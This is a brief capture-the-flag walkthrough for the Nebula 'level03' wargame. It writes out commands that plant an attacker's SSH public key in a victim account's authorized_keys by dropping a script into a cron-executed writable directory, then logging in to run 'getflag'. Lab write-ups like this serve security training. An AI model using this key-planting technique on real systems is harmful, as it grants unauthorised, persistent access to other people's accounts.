# [Level03](https://exploit-exercises.com/nebula/level03/)

Make sure your attacking machine has a ssh key (we'll call it `SOMEKEY`):

```bash
ssh-keygen
```

Create a script on the victim machine as the `level03` user at `/tmp/attack.sh`:

```bash
mkdir ~/.ssh
touch ~/.ssh/authorized_keys
echo "ssh-rsa SOMEKEY" >> ~/.ssh/authorized_keys
```

Now copy `/tmp/attack.sh` into `/home/flag03/writable.d`:

```bash
cp /tmp/attack.sh /home/flag03/writable.d
```

When the cronjob runs, `/home/flag03/writable.d/attack.sh` will be deleted and our ssh key `SOMEKEY` will be in the `authorized_keys` of the `flag03` account.

SSH into the victim machine as `flag03` and do:

```bash
getflag
```
